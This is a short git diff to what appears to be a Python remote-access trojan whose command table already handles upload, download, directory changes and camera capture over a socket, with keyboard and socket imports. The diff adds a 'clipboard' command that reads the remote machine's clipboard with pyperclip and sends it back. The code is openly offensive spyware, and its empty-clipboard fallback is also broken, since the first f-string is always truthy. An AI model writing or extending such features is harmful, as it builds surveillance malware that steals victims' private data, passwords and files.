@@ -5,6 +5,7 @@ from colorama import (  # type: ignore
 
 import subprocess
 import threading
+import pyperclip
 import keyboard
 import socket
 import base64
@@ -89,7 +90,8 @@ class Commands(object):
             "upload": self.upload_command,
             "cd": self.change_directory,
             "camera": self.camera_command,
-            "download": self.download_command
+            "download": self.download_command,
+            "clipboard": self.clipboard_command,
         }
 
     def verify_command(self):
@@ -120,6 +122,10 @@ class Commands(object):
 
     def upload_command(self) -> str:
         return File(self.command[1]).write(self.command[2]) 
+
+    def clipboard_command(self):
+        clip = pyperclip.paste()
+        return f"{Fore.GREEN}[+] {clip}" or f"{Fore.RED}[-] CLIPBOARD IS EMPTY..."
 
 
 class Socket(object):
